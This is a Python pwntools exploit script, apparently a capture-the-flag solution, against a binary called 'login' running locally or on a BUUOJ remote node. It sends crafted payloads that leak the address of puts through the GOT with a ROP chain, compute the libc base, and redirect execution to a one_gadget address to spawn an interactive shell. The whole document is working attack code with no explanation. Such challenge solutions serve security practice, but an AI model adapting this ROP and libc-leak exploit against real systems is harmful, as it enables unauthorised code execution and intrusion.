#coding:utf-8
import sys
from pwn import *
context.log_level='debug'
elfelf='./login'
#context.arch='amd64'
while True :
    # try :
        elf=ELF(elfelf)
        context.arch=elf.arch
        if len(sys.argv)==1 :
            io=process(elfelf)
            # io=process([elf,'127.0.0.1','9999'])
            libc=ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
            # ld = ELF('/lib/x86_64-linux-gnu/ld-2.23.so')
            one_gadgaet=[0x45226,0x4527a,0xf0364,0xf1207]
        else :
            io=remote('node3.buuoj.cn',26961)
            libc=ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
            # ld = ELF('/lib/x86_64-linux-gnu/ld-2.23.so')
            one_gadgaet=[0x45226,0x4527a,0xf0364,0xf1207]
        io.recv()
        pay='admin\x00\x00\x00'+p64(0x0000000000401ab3)+p64(elf.got['puts'])+p64(0x4018B5)
        io.send(pay)
        io.recv()
        io.send('admin\x00\x00\x00'+p64(0)*3+p64(0x602400))
        
        libc_base=u64(io.recvuntil('\x7f')[-6:]+'\x00\x00')-libc.sym['puts']
        libc.address=libc_base
        bin_sh_addr=libc.search('/bin/sh\x00').next()
        system_addr=libc.sym['system']
        io.recv()
        pay='admin\x00\x00\x00'*3+p64(0x4527a+libc_base)
        io.send(pay)
        io.recv()
        # gdb.attach(io)
        io.send('admin\x00\x00\x00'*4+p64(0x602418))
        
        success('libc_base:'+hex(libc_base))
        # success('heap_base:'+hex(heap_base))
        
        # 
        io.interactive()
    # except Exception as e:
    #   io.close()
    #   continue
    # else:
    #   continue